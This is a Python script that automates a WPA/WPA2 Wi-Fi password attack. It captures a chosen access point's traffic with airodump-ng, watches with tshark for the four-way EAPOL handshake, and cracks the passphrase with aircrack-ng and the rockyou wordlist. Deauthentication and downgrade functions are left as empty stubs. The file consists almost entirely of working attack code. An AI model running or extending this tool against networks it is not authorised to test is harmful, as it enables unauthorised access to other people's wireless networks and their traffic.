#!/usr/bin/env python3

import os
import subprocess
import time
from datetime import datetime
from monitor import main as monitor_main

# Run as root

#if os.geteuid() != 0:
#    print("Please run as root")
#    exit(1)

CAP_DIR = "CaptureFiles"  

def inputs():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_name = f"{CAP_DIR}/capture_{timestamp}"
    bssid = input("Enter target AP BSSID: ")
    channel = int(input("Enter target AP channel: "))

    return file_name, bssid, channel

def airodump(file_name, bssid, channel):
    """Starts airodump-ng and waits for the capture file to appear."""

    cap_file = f"{file_name}-01.cap"
    airodump_cmd = ["airodump-ng", "-d", bssid, "-c", str(channel), "-w", file_name, "wlan1"]
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not cap_file:
        print("Error: No capture file found!")
        airodump_proc.terminate()
        return None, airodump_proc  # Ensure it still returns a tuple

    print(f"Using capture file: {cap_file}")
    return cap_file, airodump_proc

def tshark():
    """Monitors the capture file for EAPOL packets."""
    file_name, bssid, channel = inputs()
    cap_file, airodump_proc = airodump(file_name, bssid, channel)

    time.sleep(2)  # Give time to start filling the file
    print("Checking for EAPOL packets...")

    eapol_count = 0
    try:
        while eapol_count != 4:
            cmd = ["tshark", "-r", cap_file, "-Y", "eapol", "-l"]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            for line in process.stdout:
                print(line.strip())
                if eapol_count >= 4:
                    print("Captured 4 way handshake!")
                    return
                else:
                    if "EAPOL" in line:
                        eapol_count += 1
                        print(f"EAPOL: {eapol_count}/4")
                        time.sleep(1) # Helps ensure buffer time between file reads
            
            process.wait()
            time.sleep(1) 

    finally:
        airodump_proc.terminate()
        return cap_file

def deauth():
    pass

def downgrade():
    pass

def crack(cap_file):
    aircrack_cmd = ["aircrack-ng", "-w", "Wordlists/rockyou.txt", cap_file]
    aircrack_proc = subprocess.run(aircrack_cmd, text=True, capture_output=True)
    print(aircrack_proc.stdout)

if __name__ == '__main__':
    if monitor_main():
        cap_file = tshark()
        crack(cap_file)
